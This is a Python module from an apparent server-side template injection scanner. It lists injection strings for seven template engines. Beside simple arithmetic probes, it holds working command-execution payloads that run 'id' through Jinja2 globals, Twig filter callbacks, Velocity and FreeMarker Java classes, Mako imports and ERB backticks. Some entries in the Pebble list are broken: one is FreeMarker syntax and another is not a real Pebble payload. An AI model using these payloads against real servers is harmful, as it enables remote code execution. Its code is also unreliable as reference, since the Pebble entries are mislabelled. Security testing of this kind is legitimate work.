"""
Payload generation module for SSTI vulnerability testing.
Provides payloads for different template engines.
"""

import logging
from typing import Dict, List

class PayloadGenerator:
    """
    Generates SSTI payloads for various template engines.
    Provides methods to get payloads based on the target template engine.
    """
    
    def __init__(self):
        """Initialize the payload generator with payloads for different template engines."""
        self._payloads = {
            # Jinja2 payloads (Python)
            "jinja2": [
                # Basic expression test
                "{{7*7}}",
                # Another math expression
                "{{7*'7'}}",
                # Variable output
                "{{config}}",
                # Access to internal objects
                "{{self}}",
                # Basic math with a unique string for easy identification
                "{{7*7}}_SSTI_TEST_JINJA2",
                # Command execution (advanced)
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                # More advanced Jinja2-specific
                "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"id\").read()}}{%endif%}{% endfor %}",
            ],
            
            # Twig payloads (PHP)
            "twig": [
                # Basic expression test
                "{{7*7}}",
                # Another syntax 
                "{${7*7}}",
                # Checking if twig specific attributes are available
                "{{_self}}",
                # Basic math with a unique string for easy identification
                "{{7*7}}_SSTI_TEST_TWIG",
                # More complex Twig-specific
                "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
            ],
            
            # Pebble payloads (Java)
            "pebble": [
                # Basic expression test
                "{{ 7 * 7 }}",
                # Runtime class access for Java
                "{{ \"freemarker.template.utility.Execute\"?new()('id') }}",
                # Basic math with a unique string for easy identification
                "{{ 7 * 7 }}_SSTI_TEST_PEBBLE",
                # Java-specific payloads
                "{% set cmd = 'id' %}{{ cmd.execute() }}",
            ],
            
            # Velocity payloads (Java)
            "velocity": [
                # Basic expression test
                "#set($x = 7 * 7)${x}",
                # Math expression with a unique string
                "#set($x = 7 * 7)${x}_SSTI_TEST_VELOCITY",
                # Class access in Velocity
                "#set($runtime = $class.forName('java.lang.Runtime'))${runtime.getRuntime().exec('id')}",
            ],
            
            # FreeMarker payloads (Java)
            "freemarker": [
                # Basic expression test
                "${7 * 7}",
                # Basic test with a unique string
                "${7 * 7}_SSTI_TEST_FREEMARKER",
                # FreeMarker specific
                "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            ],
            
            # Mako payloads (Python)
            "mako": [
                # Basic expression test
                "${7 * 7}",
                # Basic math with a unique string
                "${7 * 7}_SSTI_TEST_MAKO",
                # Python code execution in Mako
                "<%import os%>${os.popen('id').read()}",
            ],
            
            # ERB payloads (Ruby)
            "erb": [
                # Basic expression test
                "<%= 7 * 7 %>",
                # Basic math with a unique string
                "<%= 7 * 7 %>_SSTI_TEST_ERB",
                # Ruby code execution in ERB
                "<%= `id` %>",
            ]
        }
        
        # Simple payload to test for basic templating functionality
        self._common_payloads = [
            "{{7*7}}",      # Common in Jinja2, Twig, Pebble
            "${7*7}",       # Common in FreeMarker, Mako
            "#set($x=7*7)${x}", # Velocity
            "<%= 7*7 %>",   # ERB
            "{7*7}",        # Simplified
            "[[7*7]]"       # Other format
        ]
    
    def generate_payloads(self, template_engine: str) -> List[str]:
        """
        Generate payloads for a specific template engine.
        
        Args:
            template_engine: The target template engine
            
        Returns:
            List of payloads for testing
        """
        if template_engine.lower() not in self._payloads:
            logging.warning(f"Unknown template engine: {template_engine}. Using common payloads.")
            return self._common_payloads
        
        return self._payloads[template_engine.lower()]
    
    def get_all_payloads(self) -> Dict[str, List[str]]:
        """
        Get all available payloads.
        
        Returns:
            Dictionary of template engines and their payloads
        """
        return self._payloads
    
    def get_common_payloads(self) -> List[str]:
        """
        Get common payloads that work across multiple engines.
        
        Returns:
            List of common payloads
        """
        return self._common_payloads
